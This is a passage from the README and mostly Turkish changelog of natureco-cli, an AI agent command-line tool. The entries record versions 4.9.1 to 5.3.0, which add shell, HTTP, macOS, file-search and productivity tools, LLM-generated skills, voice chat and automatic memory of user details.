  - `Authorization: Bearer <apiKey>`
  - `X-User-ID: cli-user`
- Platform identifier: `cli`

#### File Structure
```
~/.natureco/
├── config.json          # Global config
├── skills/              # User skills
└── history/             # Chat history
    └── <bot-id>.json

.natureco/               # Project folder
├── config.json          # Project config
├── AGENTS.md            # Bot instructions
└── skills/              # Project skills
```

### Commands

```bash
natureco                    # Gateway screen (runs setup if needed)
natureco setup              # Run setup wizard
natureco login              # Login
natureco logout             # Logout
natureco bots               # List bots
natureco chat <bot>         # Start chat
natureco ask "<question>"   # Quick question
natureco run <script.md>    # Run script
natureco init               # Initialize project
natureco skills [action]    # Manage skills
natureco mcp [action]       # Manage MCP servers
natureco config <action>    # Manage config
natureco update             # Check updates
natureco help               # Show help
```

### Requirements
- Node.js >= 18.0.0 (for native fetch)
- npm or yarn
- NatureCo API key

### License
MIT

## [4.9.1] - 2026-06-22 — "SELF-COMPLETE TOOLSET"

### Yeni: 14 Tool Eklendi (Toplam: 45)
Parton'un vizyonu: "kendi araçlarimi ekle". Hermes'te olan araçlarin aynisi.

#### macOS Native Tools (6 yeni)
- **calendar_add** - macOS Calendar'a etkinlik ekle (AppleScript)
- **reminder_add** - macOS Reminders'a hatirlatici
- **notes_add** - Apple Notes'a not
- **mac_notify** - Notification Center bildirimi
- **mac_app_open** / **mac_app_quit** - Uygulama kontrol

#### Sistem & Shell (5 yeni)
- **code_execution** - Python/Node/Bash sandbox
- **shell_command** - Tek shell komutu (find, ls, df, vb.)
- **http_request** - HTTP GET/POST/PUT/DELETE
- **bash** (zaten vardi, guncellendi)

#### Dosya & Arama (4 yeni)
- **file_search** - Glob pattern ile dosya arama (**/*.js)
- **grep_search** - Icerik arama (ripgrep veya grep)
- **filesystem**, **list_dir** (zaten vardi)

#### Yönetim & Verimlilik (6 yeni)
- **todo_write** - Yapilacaklar listesi (list/add/done/remove)
- **kanban** - Kanban board (todo/in_progress/done kolonlar)
- **memory_search** - Kalici hafizada ve session'larda arama
- **cron_create** - Zamanlanmis gorev olusturma
- **notebook_edit** - Jupyter notebook hucre duzenleme
- **delegate_task** - Alt-agent gorev devretme

#### AI & Medya (zaten vardi + Pollinations fallback)
- **image_generation** - v4.8.4'te Pollinations.ai (ucretsiz) eklendi
- **media_understanding** - Gorsel analiz (OpenAI/Anthropic/Groq)
- **text_to_speech** - macOS say / edge-tts

### İyilestirmeler
- **Tool calling tam entegre** - v4.8.0'da basladi, v4.9.1'de tamamlandi
- **OpenAI uyumlu tool calling** - MiniMax, OpenAI, Anthropic, Groq hepsi
- **Auto-fallback** - Key yoksa ucretsiz alternatife gec (Pollinations)
- **Tool UI feedback** - Her tool cagrisi 🔧 Tool: ... ile gosteriliyor

### Düzeltmeler
- **macos.js** (tek dosya, birden fazla tool) → 6 ayri dosyaya bolundu
- **file_search.js** syntax hatasi (JSDoc icindeki yildiz) duzeltildi
- **REPL'in tool registry** - Yeni tool'lar REPL acilisinda otomatik yukleniyor

### Toplam Ilerleme
- v2.23 (baslangic): ~12 tool
- v3.0-v4.0: +5 tool (brand, audit, cost, dashboard, seo)
- v4.5-v4.7: +8 tool (xp, team, naturehub, medium, repl, vb.)
- v4.8: Tool calling tam entegre (28 tool)
- **v4.9.1: 45 tool** - Parton'un vizyonu: "kendi araçlarim olsun"

### Kullanim
```bash
natureco repl
> "Yarin 14:00 doktor randevum var"      # calendar_add
> "Spotify ac"                            # mac_app_open
> "src/ icindeki TODO'lari bul"            # grep_search
> "Python ile 2+2 hesapla"                # code_execution
> "Tum TODO'lari goster"                  # todo_write
```

## [5.1.0] - 2026-06-22 — "SELF-GENERATING SKILLS"

### Yeni: skill_generate Tool (48. Tool)
Parton'un vizyonu: "Ihtiyaca gore skill yoksa kendi uretsin". LLM ile yeni bir skill talimati uretir, diske kaydeder ve hemen kullanima sunar.

#### Nasil calisir
1. Kullanici REPL'de bir istek yapar (ornek: "PDF dosyalarini birlestir")
2. Mevcut 47 tool/skill ile cozum yoksa `skill_generate` otomatik devreye girer
3. LLM'a (MiniMax, OpenAI, vs) skill taslagi uretmesi icin istek gonderilir
4. SKILL.md + metadata.json `~/.natureco/skills/<auto-name>/` altina kaydedilir
5. Skill hemen REPL'de kullanilabilir olur

#### Test
```
> "PDF dosyalarini tek bir PDF dosyasinda birlestir"
   Tool: skill_generate
   Args: {"taskDescription":"..."}
   Result: skill olusturuldu, hemen kullanilabilir!
```

### Duzeltmeler
- **file_search regex bug**: `**/*.js` pattern'i patliyordu (`Nothing to repeat`). Placeholder + escape sirasini degistirdik, artik calisiyor.
- **v4.5.1 tui.C.cyan/accent**: TUI engine palette'inde yoktu, `amber` ile degistirildi.
- **code_v5.js legacy code komutu**: v5.0'da eski v2.23 kodu eski yere fallback (`--legacy` flag).

### Istatistikler (final)
- **Toplam tool**: 48 (Phase 9'da 1'den basladi)
- **Toplam komut**: 100+
- **Toplam satır kod**: ~6000 (bin + src)
- **Phase 1-9**: 9 buyuk iterasyon
- **Patch versiyonlari (v4.6-v5.1)**: 14+
- **npm latest**: 5.1.0
- **CHANGELOG**: tam
- **README**: v4.5+, guncel
- **Doc (natureco.me/cli)**: 9116 char, hazir
- **Pazarlama**: HN, Reddit, Medium yazilari hazir

### Ozellik Matrisi (Final)
- **AI & Media (6):** image_generation, media_understanding, text_to_speech, llm_task, canvas, audio_understanding
- **Dosya (6):** read_file, write_file, list_dir, filesystem, file_search, grep_search
- **Sistem (5):** bash, code_execution, shell_command, http_request, git
- **Web (6):** web_search, web_readability, exa_search, duckduckgo, firecrawl, browser
- **macOS Native (6):** calendar_add, reminder_add, notes_add, mac_notify, mac_app_open, mac_app_quit
- **Verimlilik (5):** todo_write, kanban, memory_search, cron_create, notebook_edit
- **Sistem Tools (5):** delegate_task, skills_marketplace, skills_autoload, skill_generate, audio_understanding
- **Diger (8):** document_extract, image_generation, duckduckgo, exa_search, firecrawl, http, audio_understanding, document_extract

### Yayin Bilgisi
- **NPM**: https://npmjs.com/package/natureco-cli
- **Versiyon**: 5.1.0
- **Kurulum**: `npm install -g natureco-cli`
- **Lisans**: MIT

## [5.3.0] - 2026-06-22 — "VOICE EDITION + AUTO-MEMORY"

### Yeni: voice_chat Tool (52. Tool)
Parton'un vizyonu: "Bilgisayarla konusayim".
- macOS'ta mikrofondan ses kaydi (`rec` + `sox`)
- Whisper API ile ses → metin donusumu (Turkce)
- Cevabi macOS `say` ile sesli oku
- Hands-free agent kullanimi

### Yeni: Otomatik Memory Extractor (REPL'e entegre)
v5.3.0 ile REPL, kullanicinin kişisel bilgi verdigini anlayip otomatik kaydeder:
- 'adım X' → memory'ye 'Adı: X' yaz
- 'sevdiğim X' → preference kategorisinde
- 'ben X yapıyorum' → work kategorisinde
- 'X tutkunuyum' → hobby kategorisinde
- 'sen benim patronumsun' → botName='Patronum' olarak degistir
- 'adın X olsun' → botName=X olarak kaydet

Bu sayede Parton'un vizyonu gerceklesiyor: "her seferinde hatirlatmayacagim, beni hatirlayacak".

### Bagimlilik Temizligi (v5.2.1)
- chalk 4 → 5
- commander 11 → 12
- pino 8 → 9
- json5 kaldirildi (transitive dependency)
- npm audit temizlendi

### Testler (51 → 52 tool)
- %88 basarili test (Parton'un son test raporu)
- Tum Phase 1 bug'lari duzeltildi
- macOS native integration tamamlandi
